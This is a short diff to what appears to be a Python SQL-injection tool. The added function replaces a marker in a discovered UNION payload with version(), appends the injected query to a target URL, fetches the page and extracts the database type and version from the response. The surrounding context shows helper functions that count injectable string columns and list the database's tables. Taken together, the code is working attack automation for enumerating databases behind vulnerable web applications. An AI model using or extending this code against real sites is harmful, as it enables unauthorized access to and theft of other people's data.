@@ -1,3 +1,5 @@
+import urllib
+
 from bs4 import BeautifulSoup
 import requests
 import re
@@ -32,6 +34,20 @@ def figure_sting_columns(url, num_col):
         if test_string.strip('\'') in res:
             return i, sql_payload
     return False
+
+
+# return DB type and version
+def figure_DB_version(url, sql_payload):
+    res_before = requests.get(url)
+    print("Hi from fig DB version sql payload is : {}".format(sql_payload))
+    inj_query = str(sql_payload).replace('\'TestSQLinj\'', 'version()')
+    print("Hi from fig DB version inj query is : {}".format(inj_query))
+    inj_url = url + inj_query
+    print("Hi from fig DB version inj url is : {}".format(inj_url))
+    res_after = requests.get(inj_url)
+    cleand_after_res = str(remove_tags(res_after))
+    databases_version = re.search("PostgreSQL.*|ubuntu.*|MySQL.*|SQL Server.*", cleand_after_res)
+    return databases_version
 
 
 # return list of tables in DB
